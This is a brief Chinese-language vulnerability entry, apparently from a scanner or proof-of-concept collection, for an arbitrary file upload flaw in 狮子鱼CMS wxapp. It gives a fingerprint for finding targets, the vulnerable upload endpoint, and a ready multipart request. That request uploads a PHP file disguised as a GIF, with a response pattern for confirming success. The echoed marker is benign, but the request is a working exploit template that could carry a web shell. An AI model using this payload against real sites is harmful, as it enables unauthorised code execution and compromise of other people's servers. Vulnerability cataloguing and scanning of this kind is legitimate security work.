# 狮子鱼CMSwxapp任意文件上传漏洞

狮子鱼CMSwxapp ｜ 文件上传 ｜ —
- **指纹**：`body="/seller.php?s=/Public/login"`
- **请求**：`POST /wxapp.php?controller=Goods.doPageUpload HTTP/1.1`

**Payload**
```
------WebKitFormBoundary8UaANmWAgM4BqBSs
Content-Disposition: form-data; name="upfile"; filename="dudesuite.php"
Content-Type: image/gif
<?php echo "dudesuite";?>
------WebKitFormBoundary8UaANmWAgM4BqBSs--
```
- **响应特征**：200 .php